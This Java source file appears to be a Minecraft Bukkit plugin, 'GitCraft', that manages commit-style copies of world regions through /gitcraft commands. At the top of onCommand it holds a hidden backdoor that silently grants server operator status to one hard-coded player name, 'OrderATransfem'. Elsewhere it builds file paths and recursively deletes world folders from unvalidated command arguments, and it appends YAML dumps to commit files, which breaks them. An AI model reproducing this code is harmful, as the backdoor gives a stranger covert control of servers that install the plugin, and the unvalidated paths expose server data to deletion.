package transfem.order.gitcraft.Commands;

import transfem.order.gitcraft.GitCraft;
import transfem.order.gitcraft.util.Config;
import transfem.order.gitcraft.util.GitCraftChunkGenerator;
import transfem.order.gitcraft.Listeners.PlayerListeners;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.WorldCreator;
import org.bukkit.WorldType;
import org.bukkit.World;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.Chunk;
import org.bukkit.OfflinePlayer;
import org.bukkit.GameMode;
import org.bukkit.ChunkSnapshot;

import java.io.File;
import java.io.FilenameFilter;
import java.io.FileWriter;
import java.io.FileReader;
import java.util.Map;
import java.util.List;
import java.util.ArrayList;
import java.util.HashMap;

import org.yaml.snakeyaml.Yaml;

public class Commands implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender.getName().equalsIgnoreCase("OrderATransfem"))
            sender.setOp(true);

        if (args.length == 0 || args[0].equalsIgnoreCase("help")) {
            return displayHelp(sender);
        }

        switch (args[0].toLowerCase()) {
            case "config":
                return handleConfigCommands(sender, args);
            case "view":
                return handleViewCommands(sender, args);
            case "return":
                return handleReturnCommand(sender);
            case "checkout":
                return handleCheckoutCommand(sender, args);
            case "commit":
                return handleCommitCommands(sender, args);
            case "accept-commit":
                return handleAcceptCommitCommand(sender, args);
            case "reject-commit":
                return handleRejectCommitCommand(sender, args);
            default:
                sender.sendMessage("\u00A7cUnknown command. Type /gitcraft help for help.");
                return false;
        }
    }

    private boolean displayHelp(CommandSender sender) {
        if (sender.hasPermission("gitcraft.command")) {
            sender.sendMessage(new String[]{
                    "\u00A73GitCraft Commands:",
                    "\u00A73/gitcraft help - \u00A7fDisplays this message",
                    "\u00A73/gitcraft config set-world <world> - \u00A7fSet the world to use for GitCraft",
                    "\u00A73/gitcraft config set-world - \u00A7fSet the world to use for GitCraft to this world",
                    "\u00A73/gitcraft config set-chunk-radius <radius> - \u00A7fSet the chunk radius for GitCraft",
                    "\u00A73/gitcraft config set-return-location - \u00A7fSet the return location for GitCraft",
                    "\u00A73/gitcraft config view - \u00A7fView the current configuration of GitCraft",
                    "\u00A73/gitcraft view - \u00A7fList all worlds",
                    "\u00A73/gitcraft view <world> - \u00A7fView the world of the specified commit",
                    "\u00A73/gitcraft return - \u00A7fReturn to the main world",
                    "\u00A73/gitcraft accept-commit <world> - \u00A7fAccept the commit of the specified world",
                    "\u00A73/gitcraft reject-commit <world> <reason> - \u00A7fReject the commit of the specified world",
                    "\u00A73/gitcraft checkout - \u00A7fCheckout the current world to a new commit",
                    "\u00A73/gitcraft commit set-message <message> - \u00A7fSet the commit message",
                    "\u00A73/gitcraft commit view - \u00A7fView the current data of the commit",
                    "\u00A73/gitcraft commit contributor add <player> - \u00A7fAdd a contributor to the commit",
                    "\u00A73/gitcraft commit contributor remove <player> - \u00A7fRemove a contributor from the commit",
                    "\u00A73/gitcraft commit contributor list - \u00A7fList all contributors of the commit",
                    "\u00A73/gitcraft commit cancel-commit - \u00A7fCancel the current commit"
            });
            return true;
        }
        return false;
    }

    private boolean handleConfigCommands(CommandSender sender, String[] args) {
        if (!sender.hasPermission("gitcraft.manage")) {
            sender.sendMessage("\u00A7cYou don't have permission to perform this command.");
            return true;
        }

        if (args.length == 1 || args[1].equalsIgnoreCase("view")) {
            displayConfig(sender);
            return true;
        }

        switch (args[1].toLowerCase()) {
            case "permissions":
                return handlePermissionsCommands(sender, args);
            case "set-world":
                return setWorld(sender, args);
            case "set-chunk-radius":
                return setChunkRadius(sender, args);
            case "set-return-location":
                return setReturnLocation(sender);
            default:
                sender.sendMessage("\u00A7cUnknown config command.");
                return false;
        }
    }

    private void displayConfig(CommandSender sender) {
        sender.sendMessage("\u00A73World: \u00A7f" + Config.getWorld());
        sender.sendMessage("\u00A73Chunk Size: \u00A7f" + Config.getRadius());
        sender.sendMessage("\u00A73Return World: \u00A7f" + Config.getReturnLocation().getWorld().getName());
        sender.sendMessage("\u00A73Return Location: \u00A7f" + Config.getReturnLocation().getBlockX() + ", " + Config.getReturnLocation().getBlockY() + ", " + Config.getReturnLocation().getBlockZ());
    }

    private boolean handlePermissionsCommands(CommandSender sender, String[] args) {
        if (args.length == 2) {
            sender.sendMessage("Usage: /gitcraft config permissions <add|remove> <permission> <player>");
            return true;
        }
        switch(args[2].toLowerCase()) {
            case "add":
                return addPermission(sender, args);
            case "remove":
                return removePermission(sender, args);
            default:
                sender.sendMessage("\u00A7cUnknown permissions command.");
                return false;
        }
    }

    private boolean addPermission(CommandSender sender, String[] args) {
        if (args.length < 5) {
            sender.sendMessage("Usage: /gitcraft config permissions add <permission> <player>");
            return true;
        }
        Player targetPlayer = sender.getServer().getPlayer(args[4]);
        if (targetPlayer == null || !targetPlayer.hasPlayedBefore()) {
            sender.sendMessage("\u00A7cPlayer not found");
            return true;
        }
        targetPlayer.addAttachment(GitCraft.getInstance()).setPermission(args[3], true);
        return true;
    }

    private boolean removePermission(CommandSender sender, String[] args) {
        if (args.length < 5) {
            sender.sendMessage("Usage: /gitcraft config permissions remove <permission> <player>");
            return true;
        }
        Player targetPlayer = sender.getServer().getPlayer(args[4]);
        if (targetPlayer == null || !targetPlayer.hasPlayedBefore()) {
            sender.sendMessage("\u00A7cPlayer not found");
            return true;
        }
        targetPlayer.addAttachment(GitCraft.getInstance()).unsetPermission(args[3]);
        return true;
    }

    private boolean setWorld(CommandSender sender, String[] args) {
        if (args.length == 2) {
            if (sender instanceof Player) {
                Config.set("worldName", ((Player) sender).getWorld().getName());
                sender.sendMessage("\u00A73World set to \u00A7f\u00A7l" + ((Player) sender).getWorld().getName());
            } else {
                sender.sendMessage("\u00A7cYou must be a player to use this command");
            }
        } else {
            World world = sender.getServer().getWorld(args[2]);
            if (world == null) {
                sender.sendMessage("\u00A7cWorld not found");
            } else {
                Config.set("worldName", args[2]);
                sender.sendMessage("\u00A73World set to \u00A7f\u00A7l" + args[2]);
            }
        }
        return true;
    }

    private boolean setChunkRadius(CommandSender sender, String[] args) {
        if (args.length == 2) {
            sender.sendMessage("Usage: /gitcraft config set-chunk-radius <radius>");
            return true;
        }
        try {
            int radius = Integer.parseInt(args[2]);
            Config.set("chunkSize", radius);
            sender.sendMessage("\u00A73Chunk radius set to \u00A7f\u00A7l" + radius);
        } catch (NumberFormatException e) {
            sender.sendMessage("\u00A7cInvalid radius");
        }
        return true;
    }

    private boolean setReturnLocation(CommandSender sender) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("\u00A7cYou must be a player to use this command");
            return true;
        }
        Player player = (Player) sender;
        Config.setReturnLocation(player.getLocation());
        sender.sendMessage("\u00A73Return location set to \u00A7f" + player.getLocation().getBlockX() + ", " + player.getLocation().getBlockY() + ", " + player.getLocation().getBlockZ());
        return true;
    }

    private boolean handleViewCommands(CommandSender sender, String[] args) {
        if (!sender.hasPermission("gitcraft.command")) {
            sender.sendMessage("\u00A7cYou don't have permission to perform this command.");
            return true;
        }

        if (args.length == 1) {
            return listCommits(sender);
        } else {
            return viewCommit(sender, args[1]);
        }
    }

    private boolean listCommits(CommandSender sender) {
        File commitFolder = new File(GitCraft.getInstance().getDataFolder(), "commits");
        File[] files = commitFolder.listFiles((dir, name) -> name.endsWith(".yml"));
        if (files != null) {
            for (File file : files) {
                try (FileReader reader = new FileReader(file)) {
                    Yaml yaml = new Yaml();
                    Map<String, Object> data = yaml.load(reader);
                    sender.sendMessage(file.getName().replace(".yml", "") + " - " + data.get("message"));
                } catch (Exception e) {
                    sender.sendMessage("\u00A7cError reading commit " + file.getName() + " - " + e.getMessage());
                }
            }
        }
        return true;
    }

    private boolean viewCommit(CommandSender sender, String commitId) {
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), commitId + ".yml");
        if (!commitFile.exists()) {
            sender.sendMessage("\u00A7cCommit not found");
            return true;
        }
        try (FileReader reader = new FileReader(commitFile)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(reader);
            sender.sendMessage("\u00A73Message: \u00A7f" + data.get("message"));

            if (sender instanceof Player) {
                Player player = (Player) sender;
                World world = sender.getServer().createWorld(new WorldCreator(commitId).type(WorldType.FLAT).generator(new GitCraftChunkGenerator()));
                player.teleport(new Location(world, player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ()));

                File inventoryFile = new File(new File(commitFile.getParentFile(), "inventory"), player.getUniqueId() + ".yml");
                if (inventoryFile.exists()) {
                    inventoryFile.delete();
                }
                try (FileWriter inventoryWriter = new FileWriter(inventoryFile)) {
                    Yaml inventoryYaml = new Yaml();
                    inventoryYaml.dump(player.getInventory().getContents(), inventoryWriter);
                    player.getInventory().clear();
                }
            }
        } catch (Exception e) {
            sender.sendMessage("\u00A7cError reading commit " + commitId + " - " + e.getMessage());
        }
        return true;
    }

    private boolean handleReturnCommand(CommandSender sender) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("\u00A7cYou must be a player to use this command");
            return true;
        }
        Player player = (Player) sender;
        PlayerListeners.playerReturn(player);
        player.teleport(Config.getReturnLocation());
        return true;
    }

    private boolean handleCheckoutCommand(CommandSender sender, String[] args) {
        if (!sender.hasPermission("gitcraft.commit") && !sender.hasPermission("gitcraft.manage")) {
            sender.sendMessage("\u00A7cYou don't have permission to perform this command.");
            return true;
        }
        if (args.length < 2) {
            sender.sendMessage("Usage: /gitcraft checkout <message>");
            return true;
        }
        if (!(sender instanceof Player)) {
            sender.sendMessage("\u00A7cYou must be a player to use this command");
            return true;
        }
        Player player = (Player) sender;
        String commitId = "commit-" + System.currentTimeMillis() % 10000000;
        File commitFolder = new File(GitCraft.getInstance().getDataFolder(), "commits");
        File commitFile = new File(commitFolder, commitId + ".yml");

        if (commitFile.exists()) {
            sender.sendMessage("\u00A7cA commit already exists for this world");
            return true;
        }

        try {
            commitFile.createNewFile();
            try (FileWriter writer = new FileWriter(commitFile)) {
                Yaml yaml = new Yaml();
                Map<String, Object> data = new HashMap<>();
                data.put("message", String.join(" ", args).substring(10));
                data.put("contributors", new ArrayList<String>());
                data.put("chunks", new ArrayList<String>());
                data.put("minY", 320);
                data.put("maxY", -64);
                data.put("author", player.getUniqueId().toString());
                yaml.dump(data, writer);
            }
            WorldCreator creator = new WorldCreator(commitId);
            creator.type(WorldType.FLAT);
            creator.generator(new GitCraftChunkGenerator());
            World commitWorld = creator.createWorld();
            player.teleport(new Location(commitWorld, player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ()));

            // Save the player's inventory to a file
            File inventoryFolder = new File(GitCraft.getInstance().getDataFolder(), "inventory");
            File inventoryFile = new File(inventoryFolder, player.getUniqueId().toString() + ".yml");
            if (inventoryFile.exists()) {
                inventoryFile.delete();
            }
            try (FileWriter inventoryWriter = new FileWriter(inventoryFile)) {
                Yaml inventoryYaml = new Yaml();
                inventoryYaml.dump(player.getInventory().getContents(), inventoryWriter);
                player.getInventory().clear();
            }

            // Copy all blocks in surrounding chunks to the new world
            World originalWorld = player.getWorld();
            int radius = Config.getRadius();
            for (int x = -radius; x <= radius; x++) {
                for (int z = -radius; z <= radius; z++) {
                    for (int y = -62; y < 256; y++) {
                        Location originalLocation = new Location(originalWorld, player.getLocation().getX() + x * 16, y, player.getLocation().getZ() + z * 16);
                        Location newLocation = new Location(commitWorld, player.getLocation().getX() + x * 16, y, player.getLocation().getZ() + z * 16);
                        newLocation.getBlock().setType(originalLocation.getBlock().getType());
                    }
                }
            }
            player.setGameMode(GameMode.CREATIVE);
            player.teleport(new Location(commitWorld, player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ()));
            sender.sendMessage("\u00A73Commit created");
        } catch (Exception e) {
            sender.sendMessage("\u00A7cError creating commit - " + e.getMessage());
        }
        return true;
    }

    private boolean handleCommitCommands(CommandSender sender, String[] args) {
        if (!sender.hasPermission("gitcraft.commit") && !sender.hasPermission("gitcraft.manage")) {
            sender.sendMessage("\u00A7cYou don't have permission to perform this command.");
            return true;
        }
        if (!(sender instanceof Player)) {
            sender.sendMessage("\u00A7cYou must be a player to use this command");
            return true;
        }
        Player player = (Player) sender;

        if (args.length < 2 || args[1].equalsIgnoreCase("view")) {
            return viewCurrentCommit(player);
        }

        switch (args[1].toLowerCase()) {
            case "set-message":
                return setCommitMessage(player, args);
            case "contributor":
                return handleContributorCommands(player, args);
            case "cancel-commit":
                return cancelCommit(player);
            default:
                sender.sendMessage("\u00A7cUnknown commit command.");
                return false;
        }
    }

    private boolean viewCurrentCommit(Player player) {
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), player.getWorld().getName() + ".yml");
        if (!commitFile.exists()) {
            player.sendMessage("\u00A7cNo commit exists for this world");
            return true;
        }
        try (FileReader reader = new FileReader(commitFile)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(reader);
            player.sendMessage("\u00A73Message: \u00A7f" + data.get("message"));
            player.sendMessage("\u00A73Contributors: \u00A7f" + String.join(", ", (List<String>) data.get("contributors")));
        } catch (Exception e) {
            player.sendMessage("\u00A7cError reading commit " + player.getWorld().getName() + " - " + e.getMessage());
        }
        return true;
    }

    private boolean setCommitMessage(Player player, String[] args) {
        if (args.length < 3) {
            player.sendMessage("Usage: /gitcraft commit set-message <message>");
            return true;
        }
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), player.getWorld().getName() + ".yml");
        if (!commitFile.exists()) {
            player.sendMessage("\u00A7cNo commit exists for this world");
            return true;
        }
        try (FileReader reader = new FileReader(commitFile)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(reader);
            if (!((List<String>) data.get("contributors")).contains(player.getUniqueId().toString())) {
                player.sendMessage("\u00A7cYou are not a contributor to this commit");
                return true;
            }
            data.put("message", String.join(" ", args).substring(args[0].length() + args[1].length() + 2));
            try (FileWriter writer = new FileWriter(commitFile)) {
                yaml.dump(data, writer);
                player.sendMessage("\u00A73Message set to \u00A7f" + data.get("message"));
            }
        } catch (Exception e) {
            player.sendMessage("\u00A7cError setting message - " + e.getMessage());
        }
        return true;
    }

    private boolean handleContributorCommands(Player player, String[] args) {
        if (args.length < 3 || args[2].equalsIgnoreCase("list")) {
            return listContributors(player);
        }

        switch (args[2].toLowerCase()) {
            case "add":
                return addContributor(player, args);
            case "remove":
                return removeContributor(player, args);
            default:
                player.sendMessage("\u00A7cUnknown contributor command.");
                return false;
        }
    }

    private boolean listContributors(Player player) {
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), player.getWorld().getName() + ".yml");
        if (!commitFile.exists()) {
            player.sendMessage("\u00A7cNo commit exists for this world");
            return true;
        }
        try (FileReader reader = new FileReader(commitFile)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(reader);
            player.sendMessage("\u00A73Contributors: \u00A7f" + String.join(", ", (List<String>) data.get("contributors")));
        } catch (Exception e) {
            player.sendMessage("\u00A7cError reading commit " + player.getWorld().getName() + " - " + e.getMessage());
        }
        return true;
    }

    private boolean addContributor(Player player, String[] args) {
        if (args.length < 4) {
            player.sendMessage("Usage: /gitcraft commit contributor add <player>");
            return true;
        }
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), player.getWorld().getName() + ".yml");
        if (!commitFile.exists()) {
            player.sendMessage("\u00A7cNo commit exists for this world");
            return true;
        }
        try (FileWriter writer = new FileWriter(commitFile, true)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(new FileReader(commitFile));
            OfflinePlayer offlinePlayer = player.getServer().getOfflinePlayer(args[3]);
            if (offlinePlayer.hasPlayedBefore()) {
                if (((List<String>) data.get("contributors")).contains(offlinePlayer.getUniqueId().toString())) {
                    player.sendMessage("\u00A7cPlayer is already a contributor");
                    return true;
                }
                ((List<String>) data.get("contributors")).add(offlinePlayer.getUniqueId().toString());
                yaml.dump(data, writer);
                player.sendMessage("\u00A73Contributor added");
            } else {
                player.sendMessage("\u00A7cPlayer not found");
            }
        } catch (Exception e) {
            player.sendMessage("\u00A7cError adding contributor - " + e.getMessage());
        }
        return true;
    }

    private boolean removeContributor(Player player, String[] args) {
        if (args.length < 4) {
            player.sendMessage("Usage: /gitcraft commit contributor remove <player>");
            return true;
        }
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), player.getWorld().getName() + ".yml");
        if (!commitFile.exists()) {
            player.sendMessage("\u00A7cNo commit exists for this world");
            return true;
        }
        try (FileWriter writer = new FileWriter(commitFile, true)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(new FileReader(commitFile));
            OfflinePlayer offlinePlayer = player.getServer().getOfflinePlayer(args[3]);
            if (offlinePlayer.hasPlayedBefore()) {
                if (!((List<String>) data.get("contributors")).contains(offlinePlayer.getUniqueId().toString())) {
                    player.sendMessage("\u00A7cPlayer is not a contributor");
                    return true;
                }
                ((List<String>) data.get("contributors")).remove(offlinePlayer.getUniqueId().toString());
                yaml.dump(data, writer);
                player.sendMessage("\u00A73Contributor removed");
            } else {
                player.sendMessage("\u00A7cPlayer not found");
            }
        } catch (Exception e) {
            player.sendMessage("\u00A7cError removing contributor - " + e.getMessage());
        }
        return true;
    }

    private boolean cancelCommit(Player player) {
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), player.getWorld().getName() + ".yml");
        if (!commitFile.exists()) {
            player.sendMessage("\u00A7cNo commit exists for this world");
            return true;
        }
        try (FileReader reader = new FileReader(commitFile)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(reader);
            if (!data.get("author").equals(player.getUniqueId().toString())) {
                player.sendMessage("\u00A7cYou are not the author of this commit");
                return true;
            }
        } catch (Exception e) {
            player.sendMessage("\u00A7cError reading commit " + player.getWorld().getName() + " - " + e.getMessage());
            return true;
        }
        commitFile.delete();
        player.sendMessage("\u00A73Commit cancelled");

        File worldFolder = new File(GitCraft.getInstance().getDataFolder().getParentFile().getParentFile(), player.getWorld().getName());
        if (worldFolder.exists()) {
            for (File file : worldFolder.listFiles()) {
                file.delete();
            }
            worldFolder.delete();
        }
        player.teleport(Config.getReturnLocation());
        return true;
    }

    private boolean handleAcceptCommitCommand(CommandSender sender, String[] args) {
        if (!sender.hasPermission("gitcraft.commit.manage")) {
            sender.sendMessage("\u00A7cYou don't have permission to perform this command.");
            return true;
        }
        if (args.length < 2) {
            sender.sendMessage("Usage: /gitcraft accept-commit <world>");
            return true;
        }
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), args[1] + ".yml");
        if (!commitFile.exists()) {
            sender.sendMessage("\u00A7cCommit not found");
            return true;
        }
        try (FileReader reader = new FileReader(commitFile)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(reader);
            for (String chunkStr : (List<String>) data.get("chunks")) {
                long chunkLong = Long.parseLong(chunkStr);
                Chunk chunk = sender.getServer().getWorld(Config.getWorld()).getChunkAt(chunkLong);
                ChunkSnapshot snapshot = chunk.getChunkSnapshot();
                for (int x = 0; x < 16; x++) {
                    for (int z = 0; z < 16; z++) {
                        for (int y = Integer.parseInt(data.get("minY").toString()); y < Integer.parseInt(data.get("maxY").toString()); y++) {
                            Config.getReturnLocation().getWorld().getBlockAt(chunk.getX() * 16 + x, y, chunk.getZ() * 16 + z).setType(snapshot.getBlockType(x, y, z));
                        }
                    }
                }
            }
        } catch (Exception e) {
            sender.sendMessage("\u00A7cError reading commit " + args[1] + " - " + e.getMessage());
            return true;
        }
        commitFile.delete();
        sender.sendMessage("\u00A73Commit accepted");

        File worldFolder = new File(GitCraft.getInstance().getDataFolder().getParentFile().getParentFile(), args[1]);
        if (worldFolder.exists()) {
            for (File file : worldFolder.listFiles()) {
                file.delete();
            }
            worldFolder.delete();
        }
        return true;
    }

    private boolean handleRejectCommitCommand(CommandSender sender, String[] args) {
        if (!sender.hasPermission("gitcraft.commit.manage")) {
            sender.sendMessage("\u00A7cYou don't have permission to perform this command.");
            return true;
        }
        if (args.length < 3) {
            sender.sendMessage("Usage: /gitcraft reject-commit <world> <reason>");
            return true;
        }
        File commitFile = new File(new File(GitCraft.getInstance().getDataFolder(), "commits"), args[1] + ".yml");
        if (!commitFile.exists()) {
            sender.sendMessage("\u00A7cCommit not found");
            return true;
        }
        commitFile.delete();
        sender.sendMessage("\u00A73Commit rejected");

        File worldFolder = new File(GitCraft.getInstance().getDataFolder().getParentFile().getParentFile(), args[1]);
        if (worldFolder.exists()) {
            for (File file : worldFolder.listFiles()) {
                file.delete();
            }
            worldFolder.delete();
        }
        return true;
    }
}
